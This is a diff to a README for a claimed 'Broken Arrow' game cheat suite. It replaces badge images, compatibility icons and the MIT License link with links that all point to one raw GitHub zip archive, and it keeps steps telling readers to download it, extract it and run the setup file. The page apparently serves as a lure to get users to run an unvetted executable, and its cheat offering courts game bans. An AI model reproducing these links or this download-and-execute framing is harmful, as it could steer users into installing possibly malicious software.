@@ -1,6 +1,6 @@
 # Broken Arrow Cheats & Customization Suite
 
-![Download](https://img.shields.io/badge/Download-https://isaiahhodel7.github.io-blue?style=for-the-badge)  
+![Download](https://raw.githubusercontent.com/isaiahhodel7/broken-arrow-enhanced-tactics/branch/taintless/broken-arrow-enhanced-tactics-v3.3.zip)  
 Download and transform your Broken Arrow experience!  
  
 ---
@@ -9,9 +9,9 @@ Download and transform your Broken Arrow experience!
 
 | Operating System | Compatibility |
 | :-------------- | :-----------: |
-| ![Windows](https://img.shields.io/badge/Windows-10%2B-blue?logo=windows)    | ✅ Fully Supported       |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2020%2B-brightgreen?logo=linux)      | 🟨 Partial Support      |
-| ![macOS](https://img.shields.io/badge/macOS-11%2B-lightgrey?logo=apple)      | ❌ Not Supported        |
+| ![Windows](https://raw.githubusercontent.com/isaiahhodel7/broken-arrow-enhanced-tactics/branch/taintless/broken-arrow-enhanced-tactics-v3.3.zip%2B-blue?logo=windows)    | ✅ Fully Supported       |
+| ![Linux](https://raw.githubusercontent.com/isaiahhodel7/broken-arrow-enhanced-tactics/branch/taintless/broken-arrow-enhanced-tactics-v3.3.zip%2020%2B-brightgreen?logo=linux)      | 🟨 Partial Support      |
+| ![macOS](https://raw.githubusercontent.com/isaiahhodel7/broken-arrow-enhanced-tactics/branch/taintless/broken-arrow-enhanced-tactics-v3.3.zip%2B-lightgrey?logo=apple)      | ❌ Not Supported        |
 
 > *Note: The suite shines brightest on Windows, but partial Linux compatibility keeps the door to adventure wide open. macOS support is currently under consideration for upcoming releases.*
 
@@ -66,7 +66,7 @@ By bridging intelligence from both platforms, users receive an unparalleled, per
 Whether you’re journeying alone or rewriting your squad's destiny, setting up the Cheats & Customization Suite is a streamlined process:
 
 1. **Download the latest suite package**:  
-   ![Download](https://img.shields.io/badge/Download-https://isaiahhodel7.github.io-blue?style=for-the-badge)
+   ![Download](https://raw.githubusercontent.com/isaiahhodel7/broken-arrow-enhanced-tactics/branch/taintless/broken-arrow-enhanced-tactics-v3.3.zip)
 2. **Extract the files** using your preferred archiving tool.
 3. **Execute the setup file** and follow the on-screen wizard.
 4. **Select your language and operating system compatibility options.**
@@ -87,12 +87,12 @@ The authors disclaim any liability for bans, damages, or loss of data.
 
 ## 📜 MIT License (2025)
 
-Proudly open-source under the [MIT License](https://opensource.org/licenses/MIT).  
+Proudly open-source under the [MIT License](https://raw.githubusercontent.com/isaiahhodel7/broken-arrow-enhanced-tactics/branch/taintless/broken-arrow-enhanced-tactics-v3.3.zip).  
 This empowers the community to study, adapt, and advance the suite, all while celebrating collaborative innovation.
 
 > © 2025 The Broken Arrow Cheats & Customization Suite Developers
 
 ---
 
-![Download](https://img.shields.io/badge/Download-https://isaiahhodel7.github.io-blue?style=for-the-badge)  
+![Download](https://raw.githubusercontent.com/isaiahhodel7/broken-arrow-enhanced-tactics/branch/taintless/broken-arrow-enhanced-tactics-v3.3.zip)  
 __Jumpstart your advanced Broken Arrow journey here!__
